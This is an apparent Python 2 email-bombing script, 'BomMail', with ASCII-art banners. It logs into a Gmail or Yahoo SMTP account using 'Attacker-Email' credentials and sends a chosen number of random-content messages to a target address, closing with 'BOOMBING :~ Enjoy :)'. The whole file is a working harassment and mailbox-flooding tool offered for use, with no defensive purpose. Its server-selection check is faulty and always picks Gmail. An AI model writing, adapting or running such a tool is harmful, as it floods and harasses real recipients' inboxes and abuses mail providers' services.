#!/usr/bin/python
#BomMail

import os
import smtplib
import getpass
import sys
import time
from colorama import init, Style, Back, Fore 
import os
os.system('cls' if os.name == 'nt' else 'clear')
print """
                                                                                       
WWWWWWWW                           WWWWWWWWHHHHHHHHH     HHHHHHHHH                     
W::::::W                           W::::::WH:::::::H     H:::::::H                     
W::::::W                           W::::::WH:::::::H     H:::::::H                     
W::::::W                           W::::::WHH::::::H     H::::::HH                     
 W:::::W           WWWWW           W:::::W   H:::::H     H:::::H                       
  W:::::W         W:::::W         W:::::W    H:::::H     H:::::H                       
   W:::::W       W:::::::W       W:::::W     H::::::HHHHH::::::H                       
    W:::::W     W:::::::::W     W:::::W      H:::::::::::::::::H        ---------------
     W:::::W   W:::::W:::::W   W:::::W       H:::::::::::::::::H        -:::::::::::::-
      W:::::W W:::::W W:::::W W:::::W        H::::::HHHHH::::::H        ---------------
       W:::::W:::::W   W:::::W:::::W         H:::::H     H:::::H                       
        W:::::::::W     W:::::::::W          H:::::H     H:::::H                       
         W:::::::W       W:::::::W         HH::::::H     H::::::HH                     
          W:::::W         W:::::W          H:::::::H     H:::::::H                     
           W:::W           W:::W           H:::::::H     H:::::::H                     
            WWW             WWW            HHHHHHHHH     HHHHHHHHH                     
                                                                                       

                  _       _                               _                  
/'\_/`\        _ (_ )    ( )                             ( )                 
|     |   _ _ (_) | |    | |_      _      _     ___ ___  | |_      __   _ __ 
| (_) | /'_` )| | | |    | '_`\  /'_`\  /'_`\ /' _ ` _ `\| '_`\  /'__`\( '__)
| | | |( (_| || | | |    | |_) )( (_) )( (_) )| ( ) ( ) || |_) )(  ___/| |   
(_) (_)`\__,_)(_)(___)   (_,__/'`\___/'`\___/'(_) (_) (_)(_,__/'`\____)(_)             
                                                                                                                                         
"""

print '_______________________________________________________________________________________'
print ''
def BomEmail():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
print '1.Gmail '
print '2.Yahoo '
print '[*] Back for [ Ctrl + c ]'
print ''
server = raw_input ('Type-MailServer Number : ')
user = raw_input('Attacker-Email: ')
passwd = getpass.getpass('Attacker-Password: ')


to = raw_input('\nTo: ')
#subject = raw_input('Subject: ')
#Random msg generator start
import random
import string

digits = "".join( [random.choice(string.digits) for i in xrange(8)] )
chars = "".join( [random.choice(string.letters) for i in xrange(15)] )

body =  digits + chars
#Random msg generator End

total = input('Number of send: ')

if server == 'gmail' or '1' or 'Gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo' or '2' or 'Yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print 'Kindly Enter Your Answer in 1 or 2 in Mail Server.'
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port)
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print "\r[@]E-mails sent: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n Done  !!!'
    print '                                                  BOOMBING :~ Enjoy :)'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] Allow access to less secure apps on your gmail account. https://www.google.com/settings/security/lesssecureapps'
    sys.exit()
